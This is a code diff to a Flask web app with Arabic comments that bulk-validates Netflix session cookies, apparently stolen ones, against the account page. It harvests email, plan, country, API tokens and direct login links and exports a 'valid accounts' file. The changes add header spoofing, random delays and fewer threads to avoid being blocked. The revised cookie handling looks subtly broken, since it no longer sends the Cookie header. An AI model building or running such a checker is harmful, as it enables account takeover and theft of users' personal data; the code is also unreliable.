@@ -1,5 +1,5 @@
 from flask import Flask, render_template_string, request, jsonify
-import requests, re, json, base64, os, time
+import requests, re, json, base64, os, time, random
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -107,7 +107,6 @@ HTML = r'''
 
         <div class="section">
             <div class="two-cols">
-                <!-- عمود رفع الملفات -->
                 <div>
                     <div style="font-weight:700; margin-bottom:10px;">📁 رفع ملفات ZIP / TXT</div>
                     <div class="upload-area" id="uploadArea">
@@ -117,7 +116,6 @@ HTML = r'''
                     </div>
                     <input type="file" id="fileInput" accept=".zip,.txt,.csv" multiple style="display:none">
                 </div>
-                <!-- عمود لصق الكوكيز -->
                 <div>
                     <div style="font-weight:700; margin-bottom:10px;">📋 لصق الكوكيز يدوياً</div>
                     <textarea id="cookieTextarea" placeholder="الصق الكوكيز هنا...\nكل كوكيز في سطر منفصل"></textarea>
@@ -145,10 +143,10 @@ HTML = r'''
     </div>
 
     <script>
-        let allCookies = [];            // {cookie, source}
+        let allCookies = [];
         let allResults = [];
         let currentFilter = 'all';
-        let abortController = null;     // للإيقاف
+        let abortController = null;
         let isChecking = false;
 
         const uploadArea = document.getElementById('uploadArea');
@@ -158,7 +156,6 @@ HTML = r'''
         const btnStop = document.getElementById('btnStop');
         const btnDownloadValid = document.getElementById('btnDownloadValid');
 
-        // --- Upload handling ---
         uploadArea.addEventListener('click', ()=> fileInput.click());
         uploadArea.addEventListener('dragover', e=> { e.preventDefault(); uploadArea.classList.add('dragover'); });
         uploadArea.addEventListener('dragleave', ()=> uploadArea.classList.remove('dragover'));
@@ -193,29 +190,23 @@ HTML = r'''
                     count += lines.length;
                 }
             }
-            if (count > 0) {
-                showToast(`✅ تم تحميل ${count} كوكيز من الملفات`, 'success');
-            }
+            if (count > 0) showToast(`✅ تم تحميل ${count} كوكيز`, 'success');
         }
 
-        // --- جمع الكوكيز من كلا المصدرين ---
         function collectAllCookies() {
             const manualText = cookieTextarea.value.trim();
             const manualCookies = manualText ? manualText.split('\n').map(l=>l.trim()).filter(l=> l && l.includes('=')) : [];
             const fileCookies = allCookies.map(c => c.cookie);
-            // دمج مع إزالة التكرارات
             const all = [...new Set([...fileCookies, ...manualCookies])];
             return all.map(c => ({ cookie: c, source: 'manual' }));
         }
 
-        // --- Start / Stop ---
         async function startCheck() {
             const cookies = collectAllCookies();
             if (cookies.length === 0) {
-                showToast('❌ لا توجد كوكيز لفحصها. ارفع ملفات أو الصق كوكيز.', 'error');
+                showToast('❌ لا توجد كوكيز', 'error');
                 return;
             }
-
             if (isChecking) return;
             isChecking = true;
             abortController = new AbortController();
@@ -229,11 +220,10 @@ HTML = r'''
             const startTime = Date.now();
             const total = cookies.length;
             let processed = 0;
-            const batchSize = 20;
+            const batchSize = 15;
 
             for (let i = 0; i < total; i += batchSize) {
                 if (signal.aborted) break;
-
                 const batch = cookies.slice(i, i+batchSize).map(c => c.cookie).join('\n');
                 try {
                     const resp = await fetch('/check_multiple', {
@@ -244,20 +234,13 @@ HTML = r'''
                     });
                     const data = await resp.json();
                     if (data.results) {
-                        data.results.forEach((r, idx) => {
-                            r.sourceFile = 'manual';
-                        });
+                        data.results.forEach((r, idx) => { r.sourceFile = 'manual'; });
                         allResults.push(...data.results);
                     }
                 } catch(e) {
                     if (e.name === 'AbortError') break;
                     for (let j = i; j < Math.min(i+batchSize, total); j++) {
-                        allResults.push({
-                            status:'error', message:'فشل الاتصال',
-                            cookie: cookies[j].cookie,
-                            sourceFile: 'manual',
-                            timestamp: new Date().toLocaleString()
-                        });
+                        allResults.push({status:'error', message:'فشل', cookie: cookies[j].cookie, timestamp: new Date().toLocaleString()});
                     }
                 }
                 processed = Math.min(i+batchSize, total);
@@ -276,16 +259,11 @@ HTML = r'''
             isChecking = false;
             updateStats();
             renderResults();
-            showToast(signal.aborted ? '⏹️ تم إيقاف الفحص' : `✅ تم فحص ${total} كوكيز`, signal.aborted ? 'info' : 'success');
+            showToast(signal.aborted ? '⏹️ تم الإيقاف' : `✅ تم فحص ${total} كوكيز`, signal.aborted ? 'info' : 'success');
         }
 
-        function stopCheck() {
-            if (abortController) {
-                abortController.abort();
-            }
-        }
+        function stopCheck() { if (abortController) abortController.abort(); }
 
-        // --- Render results (same as before) ---
         function renderResults() {
             const container = document.getElementById('resultsList');
             let filtered = currentFilter==='all' ? allResults : allResults.filter(r=> r.status===currentFilter);
@@ -305,158 +283,105 @@ HTML = r'''
                     details += '</div>';
                 }
                 const cookieText = r.cookie || '';
-                return `
-                <div class="result-card">
-                    <div class="result-header" onclick="this.nextElementSibling.classList.toggle('show')">
-                        <div style="display:flex; align-items:center; gap:10px; flex-wrap:wrap;">
-                            <span class="badge ${cls}">${statusText[r.status]||'❓'}</span>
-                            <span style="color:var(--text2);">#${idx+1}</span>
-                            <span>${r.message||''}</span>
-                        </div>
-                        <span>▼</span>
-                    </div>
-                    <div class="result-body">
-                        ${details}
-                        <div style="margin:8px 0;"><strong>🔒 الكوكيز:</strong>
-                            <div class="cookie-box">${escapeHtml(cookieText)}</div>
-                            <button class="copy-btn" onclick="copyText('${escapeQuotes(cookieText)}')">📋 نسخ الكوكيز</button>
-                        </div>
-                        ${r.api_tokens?.api_token ? `
-                        <div class="token-section">
-                            <strong>🔑 ApiToken</strong>
-                            <div style="background:#000;color:var(--green);padding:8px;border-radius:6px;font-family:monospace;word-break:break-all;margin:8px 0;">${r.api_tokens.api_token}</div>
-                            <button class="copy-btn" onclick="copyText('${escapeQuotes(r.api_tokens.api_token)}')">📋 نسخ ApiToken</button>
-                            <div class="links-grid">
-                                ${r.api_tokens.direct_links ? Object.entries(r.api_tokens.direct_links).map(([k,d]) => `
-                                    <div class="link-card">
-                                        <div class="link-icon">${d.name.split(' ')[0]}</div>
-                                        <div style="font-weight:700;">${d.name}</div>
-                                        <div style="margin:5px 0;">
-                                            <button class="open-btn" onclick="window.open('${d.url}')">🔗 فتح</button>
-                                            <button class="copy-btn" onclick="copyText('${escapeQuotes(d.url)}')">📋 نسخ</button>
-                                        </div>
-                                    </div>
-                                `).join('') : ''}
-                            </div>
-                        </div>` : ''}
-                        <div style="color:var(--text2); font-size:0.8em; margin-top:8px;">${r.timestamp||''}</div>
-                    </div>
-                </div>`;
+                return `<div class="result-card"><div class="result-header" onclick="this.nextElementSibling.classList.toggle('show')"><div style="display:flex; align-items:center; gap:10px; flex-wrap:wrap;"><span class="badge ${cls}">${statusText[r.status]||'❓'}</span><span style="color:var(--text2);">#${idx+1}</span><span>${r.message||''}</span></div><span>▼</span></div><div class="result-body">${details}<div style="margin:8px 0;"><strong>🔒 الكوكيز:</strong><div class="cookie-box">${escapeHtml(cookieText)}</div><button class="copy-btn" onclick="copyText('${escapeQuotes(cookieText)}')">📋 نسخ الكوكيز</button></div>${r.api_tokens?.api_token ? `<div class="token-section"><strong>🔑 ApiToken</strong><div style="background:#000;color:var(--green);padding:8px;border-radius:6px;font-family:monospace;word-break:break-all;margin:8px 0;">${r.api_tokens.api_token}</div><button class="copy-btn" onclick="copyText('${escapeQuotes(r.api_tokens.api_token)}')">📋 نسخ ApiToken</button><div class="links-grid">${r.api_tokens.direct_links ? Object.entries(r.api_tokens.direct_links).map(([k,d]) => `<div class="link-card"><div class="link-icon">${d.name.split(' ')[0]}</div><div style="font-weight:700;">${d.name}</div><div style="margin:5px 0;"><button class="open-btn" onclick="window.open('${d.url}')">🔗 فتح</button><button class="copy-btn" onclick="copyText('${escapeQuotes(d.url)}')">📋 نسخ</button></div></div>`).join('') : ''}</div></div>` : ''}<div style="color:var(--text2); font-size:0.8em; margin-top:8px;">${r.timestamp||''}</div></div></div>`;
             }).join('');
         }
 
-        function escapeHtml(text) {
-            return text.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-        }
-        function escapeQuotes(text) {
-            return text.replace(/'/g,"\\'").replace(/"/g,'&quot;');
-        }
-
-        function setFilter(f) {
-            currentFilter = f;
-            document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));
-            event.target.classList.add('active');
-            renderResults();
-        }
-
+        function escapeHtml(text) { return text.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+        function escapeQuotes(text) { return text.replace(/'/g,"\\'").replace(/"/g,'&quot;'); }
+        function setFilter(f) { currentFilter=f; document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active')); event.target.classList.add('active'); renderResults(); }
         function updateStats() {
             document.getElementById('statTotal').textContent = allResults.length;
             document.getElementById('statValid').textContent = allResults.filter(r=>r.status==='valid').length;
             document.getElementById('statInvalid').textContent = allResults.filter(r=>r.status==='invalid').length;
             document.getElementById('statErrors').textContent = allResults.filter(r=>r.status==='error').length;
         }
-
         function downloadValid() {
             const valid = allResults.filter(r=> r.status==='valid');
             if (!valid.length) return showToast('لا حسابات صالحة', 'error');
             let txt = '═══ حسابات Netflix الصالحة ═══\n\n';
             valid.forEach((r,i) => {
-                txt += `[${i+1}]\n`;
-                txt += `الكوكيز: ${r.cookie||'(غير متوفر)'}\n`;
+                txt += `[${i+1}]\nالكوكيز: ${r.cookie||''}\n`;
                 if (r.details) {
-                    txt += `البريد: ${r.details.email||'?'}\n`;
-                    txt += `العضوية: ${r.details.membership||'?'}\n`;
-                    txt += `الباقة: ${r.details.plan||'?'}\n`;
-                    txt += `البلد: ${r.details.country||'?'}\n`;
+                    txt += `البريد: ${r.details.email||'?'}\nالعضوية: ${r.details.membership||'?'}\nالباقة: ${r.details.plan||'?'}\nالبلد: ${r.details.country||'?'}\n`;
                 }
-                if (r.api_tokens?.api_token) {
-                    txt += `ApiToken: ${r.api_tokens.api_token}\n`;
-                }
+                if (r.api_tokens?.api_token) txt += `ApiToken: ${r.api_tokens.api_token}\n`;
                 if (r.api_tokens?.direct_links) {
-                    txt += `رابط الكمبيوتر: ${r.api_tokens.direct_links.computer?.url||''}\n`;
-                    txt += `رابط الجوال: ${r.api_tokens.direct_links.mobile?.url||''}\n`;
-                    txt += `رابط التلفاز: ${r.api_tokens.direct_links.tv?.url||''}\n`;
+                    txt += `رابط كمبيوتر: ${r.api_tokens.direct_links.computer?.url||''}\nرابط جوال: ${r.api_tokens.direct_links.mobile?.url||''}\nرابط تلفاز: ${r.api_tokens.direct_links.tv?.url||''}\n`;
                 }
-                txt += '─'.repeat(50) + '\n';
+                txt += '─'.repeat(40)+'\n';
             });
             const blob = new Blob(['\uFEFF'+txt], {type:'text/plain;charset=utf-8'});
-            const a = document.createElement('a');
-            a.href = URL.createObjectURL(blob);
-            a.download = 'netflix_valid_accounts.txt';
-            a.click();
-            showToast('💾 تم تحميل الحسابات الصالحة', 'success');
+            const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'netflix_valid_accounts.txt'; a.click();
+            showToast('💾 تم التحميل', 'success');
         }
-
         function copyText(text) { navigator.clipboard.writeText(text).then(()=> showToast('✅ تم النسخ','success')).catch(()=> showToast('❌ فشل','error')); }
-        function showToast(msg, type) {
-            const t = document.createElement('div');
-            t.className = `toast toast-${type}`;
-            t.textContent = msg;
-            document.body.appendChild(t);
-            setTimeout(()=> t.remove(), 2500);
-        }
-        function clearAll() {
-            allCookies = [];
-            allResults = [];
-            cookieTextarea.value = '';
-            document.getElementById('resultsList').innerHTML = '';
-            btnDownloadValid.disabled = true;
-            updateStats();
-            document.getElementById('statSpeed').textContent = '0s';
-            showToast('🗑️ تم مسح الكل', 'info');
-        }
+        function showToast(msg, type) { const t=document.createElement('div'); t.className=`toast toast-${type}`; t.textContent=msg; document.body.appendChild(t); setTimeout(()=>t.remove(),2500); }
+        function clearAll() { allCookies=[]; allResults=[]; cookieTextarea.value=''; document.getElementById('resultsList').innerHTML=''; btnDownloadValid.disabled=true; updateStats(); document.getElementById('statSpeed').textContent='0s'; showToast('🗑️ تم المسح','info'); }
     </script>
 </body>
 </html>
 '''
 
-# --- Backend with improved headers and delay ---
+# ========== IMPROVED BACKEND ==========
 def check_cookie(cookie):
     try:
+        # جلسة للحفاظ على الكوكيز
+        sess = requests.Session()
+        sess.cookies.update({'cookie': cookie})  # ليست ضرورية لكن للاحتياط
+
         headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
             'Accept-Encoding': 'gzip, deflate, br',
-            'Cookie': cookie,
+            'Referer': 'https://www.netflix.com/browse',
             'Sec-Fetch-Dest': 'document',
             'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-Site': 'same-origin',
             'Sec-Fetch-User': '?1',
             'Upgrade-Insecure-Requests': '1',
             'Cache-Control': 'max-age=0',
         }
-        
-        session = requests.Session()
-        r = session.get(
+
+        # الخطوة 1: تحميل الصفحة الرئيسية لتوليد كود CSRF (اختياري لكن يساعد)
+        try:
+            sess.get('https://www.netflix.com/browse', headers=headers, timeout=10)
+            time.sleep(random.uniform(0.3, 0.8))
+        except:
+            pass
+
+        # الخطوة 2: طلب صفحة الحساب مع إعادة توجيه تلقائي محدودة
+        headers['Referer'] = 'https://www.netflix.com/browse'
+        response = sess.get(
             'https://www.netflix.com/YourAccount',
             headers=headers,
-            timeout=15,
-            allow_redirects=False
+            timeout=20,
+            allow_redirects=True,   # نتابع إعادة التوجيه
+            max_redirects=5
         )
-        
+
+        # تحقق من أن الرابط النهائي ليس صفحة تسجيل الدخول
+        final_url = response.url
         result = {
             'status':'unknown','message':'','details':{},'api_tokens':{},
             'cookie': cookie,
             'timestamp':datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         }
-        
-        if r.status_code == 200:
-            if 'membershipStatus' in r.text:
-                mm = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', r.text)
-                pm = re.search(r'"planName"\s*:\s*"([^"]+)"', r.text)
-                cm = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', r.text)
-                em = re.search(r'"email"\s*:\s*"([^"]+)"', r.text)
+
+        # إذا وصلنا إلى صفحة تسجيل الدخول
+        if 'login' in final_url.lower():
+            result['status'] = 'invalid'
+            result['message'] = '❌ الكوكيز منتهية الصلاحية (تم التحويل إلى صفحة الدخول)'
+            return result
+
+        if response.status_code == 200:
+            text = response.text
+            if 'membershipStatus' in text or 'accountDetails' in text:
+                mm = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', text)
+                pm = re.search(r'"planName"\s*:\s*"([^"]+)"', text)
+                cm = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', text)
+                em = re.search(r'"email"\s*:\s*"([^"]+)"', text)
                 result['status'] = 'valid'
                 result['message'] = '✅ كوكيز صالحة والحساب نشط'
                 result['details'] = {
@@ -482,18 +407,14 @@ def check_cookie(cookie):
                         }
                     }
             else:
+                # ربما الصفحة لا تحتوي على البيانات ولكن لم يتم تحويلنا
                 result['status'] = 'valid'
-                result['message'] = '✅ كوكيز صالحة (تم تسجيل الدخول)'
-        elif r.status_code == 302:
-            result['status'] = 'invalid'
-            result['message'] = '❌ منتهية الصلاحية'
-        elif r.status_code == 403:
-            result['status'] = 'invalid'
-            result['message'] = '🚫 تم حظر الطلب'
+                result['message'] = '✅ كوكيز صالحة (تم تسجيل الدخول، لم تعثر على بيانات الحساب)'
         else:
             result['status'] = 'error'
-            result['message'] = f'⚠️ رمز الحالة: {r.status_code}'
+            result['message'] = f'⚠️ رمز الحالة: {response.status_code}'
         return result
+
     except Exception as e:
         return {'status':'error','message':str(e),'cookie':cookie,'timestamp':datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
@@ -508,8 +429,7 @@ def check_multiple():
     if not cookies: return jsonify({'status':'error'})
     lines = [c.strip() for c in cookies.split('\n') if c.strip() and '=' in c]
     results = []
-    # استخدام عدد أقل من العمال لتجنب الحظر (5 بدلاً من 10)
-    with ThreadPoolExecutor(max_workers=5) as ex:
+    with ThreadPoolExecutor(max_workers=4) as ex:   # 4 workers فقط لتجنب الحظر
         futs = {ex.submit(check_cookie, c):i for i,c in enumerate(lines,1)}
         for f in as_completed(futs):
             try:
@@ -518,7 +438,6 @@ def check_multiple():
                 results.append(res)
             except: pass
     results.sort(key=lambda x: x.get('index',0))
-    # تأخير بسيط بين الدفعات (يتم التعامل معه في الجافاسكريبت)
     return jsonify({'results':results})
 
 if __name__ == '__main__':
